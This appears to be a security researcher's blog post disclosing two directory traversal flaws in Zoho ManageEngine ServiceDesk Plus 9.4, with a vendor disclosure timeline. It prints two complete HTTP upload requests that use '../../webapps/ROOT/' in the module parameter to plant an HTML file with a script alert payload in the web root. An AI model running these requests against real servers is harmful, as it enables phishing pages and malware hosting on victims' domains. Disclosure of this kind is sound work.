---
layout: post
title: Directory Traversal Vulnerability Found in Zoho ManageEngine Service Desk Plus 9.4
tags:
  - hacking
  - websec
  - CVE-2018-19372
  - CVE-2018-19373
image: /assets/img/2019-02-18-vulnerabilities-in-zoho-servicedesk/thumbnail.jpg
---

Multiple directory traversal vulnerability exists in Zoho ManageEngine Service Desk Plus 9.4 which allows a user with at least guest access to upload a file which can be placed into a directory that is writable by the applicaiton. This includes directories that are served from the web server. An attacker can make use of this to serve malware from the domain hosting the ServiceDesk application or to perform convincing social engineering attacks by (for example) uploading an HTML file that requests a user to log in to the application. As this page will be served from the ServiceDesk domain, it will look like a valid page of the application. The following HTTP request shows using directory traversal in the “module” parameter to change the path the “testfile.html” file is uploaded to. This places the uploaded file in webapps/ROOT/<userID> directory.

### Directory Traversal in FileAttachment.jsp

```
POST /common/FileAttachment.jsp HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://example.com/AddNewProblem.cc
Content-Type: multipart/form-data; boundary=---------------------------28363178828984
Content-Length: 640
Cookie: JSESSIONID=54E0AABA3F31B6868B13E0F0E3CC775E; JSESSIONIDSSO=E79BD1E50040898CFFE31F5FA592F9DE; sdpcsrfcookie=793aa7b9-0a12-4800-b674-1f912b584d9b; servicedeskplus-_zldp=LsfUh%2FKeku%2BdsWZxSHjiX51nFQy4GpySE4FylFB4M7br5Z1XvvLoEZmwHtjfPqKs; servicedeskplus-_zldt=7567fa5e-55e1-4cff-a800-c96f8ccad8fb
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------28363178828984
Content-Disposition: form-data; name="modId"


null
-----------------------------28363178828984
Content-Disposition: form-data; name="module"


../../webapps/ROOT/
-----------------------------28363178828984
Content-Disposition: form-data; name="filePath"; filename="testfile.html"
Content-Type: text/html


<script>alert(1)</script>
-----------------------------28363178828984
Content-Disposition: form-data; name="att_desc"



-----------------------------28363178828984
Content-Disposition: form-data; name="attach"

Attach file
-----------------------------28363178828984--
```

### Directory Traversal in ResourcesAttachments.jsp

```
POST /asset/ResourcesAttachments.jsp HTTP/1.1
Host: example.com 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://example.com/asset/ResourcesAttachments.jsp
Content-Type: multipart/form-data; boundary=---------------------------6692327381577
Content-Length: 829
Cookie: JSESSIONID=6C91A33EB54282BCEAFBEBBF1FB1AA54; sdpcsrfcookie=793aa7b9-0a12-4800-b674-1f912b584d9b; servicedeskplus-_zldp=LsfUh%2FKeku%2BdsWZxSHjiX51nFQy4GpySE4FylFB4M7br5Z1XvvLoEZmwHtjfPqKs; servicedeskplus-_zldt=7567fa5e-55e1-4cff-a800-c96f8ccad8fb; JSESSIONIDSSO=CCB0AE7CCF9B8208245AC5DB0E8EC06E
Connection: close
Upgrade-Insecure-Requests: 1


-----------------------------6692327381577
Content-Disposition: form-data; name="TYPE"


null
-----------------------------6692327381577
Content-Disposition: form-data; name="wsID"


null
-----------------------------6692327381577
Content-Disposition: form-data; name="module"


../../webapps/ROOT/
-----------------------------6692327381577
Content-Disposition: form-data; name="pageName"


null
-----------------------------6692327381577
Content-Disposition: form-data; name="filePath"; filename="test123.html"
Content-Type: text/html


<script>alert(1)<script>
-----------------------------6692327381577
Content-Disposition: form-data; name="att_desc"



-----------------------------6692327381577
Content-Disposition: form-data; name="attach"


Attach file
-----------------------------6692327381577--
```

### Disclosure Timeline
- **2018-07-02**: Vulnerability raised to vendor using their bug reporting platform
- **2018-07-03**: Response from vendor acknowledging receipt of vulnerability
- **2018-08-20**: Contact vendor requesting update
- **2018-08-20**: Fix released for FileAttachment.jsp in release 9415
- **2018-08-21**: Contact vendor requesting update for ResourcesAttachments.jsp vulnerability
- **2019-01-17**: Fix released for ResourcesAttachments.jsp in release 10009
